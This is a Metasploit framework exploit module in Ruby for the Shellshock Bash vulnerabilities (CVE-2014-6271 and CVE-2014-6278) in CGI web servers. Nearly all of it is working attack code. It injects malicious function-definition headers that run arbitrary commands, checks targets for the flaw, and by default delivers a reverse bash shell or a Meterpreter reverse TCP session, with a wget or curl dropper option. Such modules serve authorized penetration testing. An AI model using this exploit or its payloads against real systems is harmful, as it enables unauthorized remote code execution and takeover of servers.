##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cgi Bash Environment Variable Code Injection (Shellshock)',
        'Description' => %q{
          This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
          handles external environment variables. This module targets CGI scripts in
          web servers by setting the HTTP_USER_AGENT environment variable to a
          malicious function definition.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y', # Added multiple targets and fixed some issues. Works now with most of the payloads.
          'Stephane Chazelas', # Vulnerability discovery
          'wvu', # Original Metasploit aux module
          'juan vazquez', # Allow wvu's module to get native sessions
          'lcamtuf' # CVE-2014-6278
        ],
        'References' => [
          [ 'CVE', '2014-6271' ],
          [ 'CVE', '2014-6278' ],
          [ 'CWE', '94' ],
          [ 'OSVDB', '112004' ],
          [ 'EDB', '34765' ],
          [ 'URL', 'https://attackerkb.com/topics/7xGOHWRpGg/cve-2014-6271' ],
          [ 'URL', 'https://access.redhat.com/articles/1200223' ],
          [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ]
        ],
        'DisclosureDate' => '2014-09-24',
        'Platform' => [ 'unix', 'linux' ],
        'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64, ARCH_ARMLE, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_AARCH64 ],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'Payload' => {
                'BadChars' => "\x22\x5B\x5D" # No double quotes and left/right brackets => makes cmd/unix/python payloads work.
              },
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ ARCH_X86, ARCH_X64, ARCH_ARMLE, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_AARCH64 ],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'printf', 'bourne', 'wget', 'curl' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false,
          'WfsDelay' => 5
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script']),
      OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),
      OptString.new('HEADER', [true, 'HTTP header to use', 'User-Agent']),
      OptInt.new('PAYLOADSIZE', [true, 'Payload size used by the CmdStager', 2048]),
      OptEnum.new('CVE', [true, 'CVE to check/exploit', 'Automatic', ['Automatic', 'CVE-2014-6271', 'CVE-2014-6278']])
    ])
  end

  def execute_command(cmd, _opts = {})
    # create the vulnerable header based on the CVE code and execute the command
    case @cve
    when 'CVE-2014-6271'
      header = %{() { :; }; echo ; /bin/bash -c "#{cmd}"}
    when 'CVE-2014-6278'
      header = %{() { _; } >_[$($())] { echo ; /bin/bash -c "#{cmd}"; }}
    end
    return send_request_cgi({
      'method' => datastore['METHOD'],
      'uri' => normalize_uri(target_uri.path.to_s),
      'headers' => {
        datastore['HEADER'] => header
      }
    })
  end

  def check
    @cve_check = {}

    if datastore['CVE'] == 'Automatic'
      cve_list = [ 'CVE-2014-6271', 'CVE-2014-6278' ]
    else
      cve_list = [ datastore['CVE'] ]
    end

    for @cve in cve_list do
      # set random marker to be discovered in the http response if target is vulnerable
      marker = rand_text_alphanumeric(8..16)
      cmd = "echo #{marker}"
      res = execute_command(cmd)
      if res && res.body.include?(marker)
        @cve_check[@cve] = true
        print_status("Target is vulnerable for #{@cve}.")
      else
        @cve_check[@cve] = false
        print_status("Target is NOT vulnerable for #{@cve}.")
      end
    end

    if @cve_check['CVE-2014-6271'] || @cve_check['CVE-2014-6278']
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    case datastore['CVE']
    when 'Automatic'
      if @cve_check
        if @cve_check['CVE-2014-6271']
          @cve = 'CVE-2014-6271'
        elsif @cve_check['CVE-2014-6278']
          @cve = 'CVE-2014-6278'
        end
      else
        # try 6271 vulnerability
        @cve = 'CVE-2014-6271'
      end
    else
      @cve = datastore['CVE']
    end

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']} using vulnerability #{@cve}.")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager(linemax: datastore['PAYLOADSIZE'])
    end
  end
end
